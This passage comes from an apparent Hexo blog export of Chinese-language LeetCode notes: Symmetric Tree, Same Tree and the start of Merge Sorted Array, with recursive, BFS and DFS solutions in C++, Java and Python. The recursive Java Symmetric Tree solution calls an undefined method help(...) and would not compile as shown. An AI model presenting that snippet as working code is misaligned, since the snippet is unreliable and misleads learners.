    <content><![CDATA[<p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p>
<p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    <span class="number">1</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">2</span>   <span class="number">2</span></span><br><span class="line"> / \ / \</span><br><span class="line"><span class="number">3</span>  <span class="number">4</span> <span class="number">4</span>  <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="number">1</span></span><br><span class="line"> / \</span><br><span class="line"><span class="number">2</span>   <span class="number">2</span></span><br><span class="line"> \   \</span><br><span class="line"> <span class="number">3</span>    <span class="number">3</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>同类题目：<a href="/2017/05/04/100-Same-Tree/" title="100. Same Tree">100. Same Tree</a></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>这种树的问题一般两种思路：递归和非递归。<br></p>
</blockquote>
<h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归来解决，注意树的比较，是左子树的右节点和右子树的左节点比较，这样才是对称的。</strong></p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/symmetric-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 68.77%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> TreeNode &#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	TreeNode *left;</span><br><span class="line">	TreeNode *right;</span><br><span class="line">	TreeNode() : val(<span class="number">0</span>), left(<span class="literal">nullptr</span>), right(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">	TreeNode(<span class="keyword">int</span> x) : val(x), left(<span class="literal">nullptr</span>), right(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">	TreeNode(<span class="keyword">int</span> x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span> isSymmetric(root-&gt;left, root-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* left, TreeNode* right)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (left == <span class="literal">nullptr</span> &amp;&amp; right == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">if</span> (left == <span class="literal">nullptr</span> || right == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span> (left-&gt;val != right-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">return</span> isSymmetric(left-&gt;left, right-&gt;right) &amp;&amp; isSymmetric(left-&gt;right, right-&gt;left);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/symmetric-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 40%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> &amp;&amp; root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> || root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isSymmetricHelp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetricHelp</span><span class="params">(TreeNode left,TreeNode right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span> &amp;&amp; right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span> || right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left.val!=right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> help(left.left,right.right)&amp;&amp;help(left.right,right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="非递归法"><a href="#非递归法" class="headerlink" title="非递归法"></a>非递归法</h2><p>使用栈或者队列来解决，主要是借助栈或者队列来解决。</p>
<p><strong>BFS思路</strong></p>
<p>广度优先遍历主要借助队列这一数据结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_p = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_q = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue_p.add(root);</span><br><span class="line">        queue_q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue_p.isEmpty()&amp;&amp;!queue_q.isEmpty())&#123;</span><br><span class="line">            TreeNode pn = queue_p.poll();</span><br><span class="line">            TreeNode qn = queue_q.poll();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue_p.size()==queue_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>DFS思路</strong></p>
<p>深度优先遍历主要借助栈这一数据结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SymmetricTree2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> &amp;&amp; root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span> || root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_left = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_right = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stack_left.push(root.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stack_right.push(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(stack_right.size()!=stack_left.size())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left.val!=root.right.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!stack_left.empty()&amp;&amp;!stack_right.empty())&#123;</span><br><span class="line">            TreeNode left = stack_left.pop();</span><br><span class="line">            TreeNode right = stack_right.pop();</span><br><span class="line">            <span class="keyword">if</span>(left.val!=right.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_left.push(left.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_right.push(right.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_left.size()!=stack_right.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_left.push(left.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_right.push(right.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_left.size()!=stack_right.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_right.size()==stack_left.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>注意深度优先遍历和广度优先遍历，这里两处的代码基本可以说是一致的，但是由于使用的栈和队列的数据结构完全不相同，所以两种思路是完全不同的。不得不感慨数据结构的强大，虽然代码逻辑完全一样，但是由于使用了不同的数据结构，却出现了两种不同的解决思路。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Tree(树)</tag>
        <tag>recursion(递归)</tag>
        <tag>Stack(栈)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>100. Same Tree</title>
    <url>/2017/05/04/100-Same-Tree/</url>
    <content><![CDATA[<p>Given two binary trees, write a function to check if they are the same or not.</p>
<p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Input:     <span class="number">1</span>         <span class="number">1</span></span><br><span class="line">          / \       / \</span><br><span class="line">         <span class="number">2</span>   <span class="number">3</span>     <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],   [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Input:     <span class="number">1</span>         <span class="number">1</span></span><br><span class="line">          /           \</span><br><span class="line">         <span class="number">2</span>             <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        [<span class="number">1</span>,<span class="number">2</span>],     [<span class="number">1</span>,null,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>Example 3:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Input:     <span class="number">1</span>         <span class="number">1</span></span><br><span class="line">          / \       / \</span><br><span class="line">         <span class="number">2</span>   <span class="number">1</span>     <span class="number">1</span>   <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],   [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">Output: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>二叉树的操作，使用递归解决。需要注意边界值检查：</p>
<ol>
<li>同时为空:true</li>
<li>两树节点不同时为空:false</li>
<li>两树节点值不相同：false</li>
<li>递归两树的左右子树</li>
</ol>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/same-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 61.62%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (p == <span class="literal">nullptr</span> &amp;&amp; q == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">if</span> (p == <span class="literal">nullptr</span> || q == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;val != q-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">return</span> isSameTree(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree(p-&gt;right, q-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/same-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 40%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="keyword">null</span> || q == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.val == q.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, val=<span class="number">0</span>, left=None, right=None)</span>:</span></span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSameTree</span><span class="params">(self, p, q)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> p==<span class="keyword">None</span> <span class="keyword">and</span> q==<span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">if</span> p==<span class="keyword">None</span> <span class="keyword">or</span> q==<span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> p.val!=q.val:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> self.isSameTree(p.left,q.left) <span class="keyword">and</span> self.isSameTree(p.right,q.right)</span><br></pre></td></tr></table></figure>
<p>具体的思路还是一个尾递归的思路，先判断尾部叶节点的元素，然后再向上递归。</p>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>使用BFS广度优先遍历</strong></p>
<blockquote>
<p>广度优先遍历借助了队列。<br>整体的思路是按层遍历，直到结束。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="comment">//Using BFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span>&amp;&amp;q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_p = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_q = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue_p.add(p);</span><br><span class="line">        queue_q.add(q);</span><br><span class="line">        <span class="keyword">while</span>(!queue_p.isEmpty()&amp;&amp;!queue_q.isEmpty())&#123;</span><br><span class="line">            TreeNode pn = queue_p.poll();</span><br><span class="line">            TreeNode qn = queue_q.poll();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_p.add(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                queue_q.add(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(queue_p.size()!=queue_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue_p.size()==queue_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用DFS深度优先遍历</strong></p>
<blockquote>
<p>深度优先遍历借助了栈。<br>整体的思路由于栈的先进后出，后进先出的特点，所以，一定会先访问到某一个叶节点再返回。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span> &amp;&amp; q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="keyword">null</span> || q==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_p = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack_q = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        stack_p.push(p);</span><br><span class="line">        stack_q.push(q);</span><br><span class="line">        <span class="keyword">while</span>(!stack_p.empty()&amp;&amp;!stack_q.empty())&#123;</span><br><span class="line">            TreeNode pn = stack_p.pop();</span><br><span class="line">            TreeNode qn = stack_q.pop();</span><br><span class="line">            <span class="keyword">if</span>(pn.val!=qn.val)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_p.push(pn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_q.push(qn.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_p.size()!=stack_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_p.push(pn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(qn.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack_q.push(qn.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stack_p.size()!=stack_q.size())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_p.size()==stack_q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两种遍历二叉树的方式很不相同，但是归根结底只是使用数据结构的不通，方法和思路是一致的。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二叉树的递归操作思路是递归思路的一种，需要去熟悉递归边界，递归式。而使用堆栈及队列的遍历操作则是一种递归的循环思路，注重数据结构的使用。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Tree(树)</tag>
        <tag>recursion(递归)</tag>
        <tag>Stack(栈)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>88. Merge Sorted Array</title>
    <url>/2017/04/27/88-Merge-Sorted-Array/</url>
    <content><![CDATA[<p>Given two sorted integer arrays <em>nums1</em> and <em>nums2</em>, merge <em>nums2</em> into <em>nums1</em> as one sorted array.</p>
<p><strong>Note:</strong></p>
<p>You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.</p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote>
<p>第一个想法，借助归并排序的思路。做一个中规中矩的做法。是可以通过的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/merge-sorted-array</span></span><br><span class="line"><span class="comment"> * Beats : 11.97%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">int</span> tmp[] = <span class="keyword">new</span> <span class="keyword">int</span>[n+m];</span><br><span class="line">    	<span class="keyword">int</span> i=<span class="number">0</span> , j=<span class="number">0</span> , k=<span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> index = <span class="number">0</span>;index&lt;m+n;index++)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(i==m) tmp[k++] = nums2[j++];</span><br><span class="line">    		<span class="keyword">else</span> <span class="keyword">if</span>(j==n) tmp[k++] = nums1[i++];</span><br><span class="line">    		<span class="keyword">else</span> <span class="keyword">if</span>(nums1[i]&lt;nums2[j])&#123;</span><br><span class="line">    			tmp[k++] = nums1[i++];</span><br><span class="line">    		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    			tmp[k++] = nums2[j++];</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> num : tmp)&#123;</span><br><span class="line">    		nums1[index++] = num;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，借助另一个空间，空间复杂度O(n)</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>其实这道题条件就已经指出了结果，m指前m个nums1元素，n指前n个nums2元素。也就是已经给出了带合并的两个数组长度，且第一个数组空出了合并第二个数组的位置，那么其实就是让你把两个数组合并到nums1上。<br>那之前为什么借助了一个数组作为临时数组，其实是为了解决最坏情况。<br>考虑一个情景：</p>
<blockquote>
<p>nums1 = [1,2,3,4] m=2;<br>nums2 = [5,6,7,8] n=2;</p>
</blockquote>
<p>按照要求，是[1,2]和[5,6]的排序，那如果不借助临时数组，在nums1中直接排序，则[5,6]会覆盖[1,2]的位置。</p>
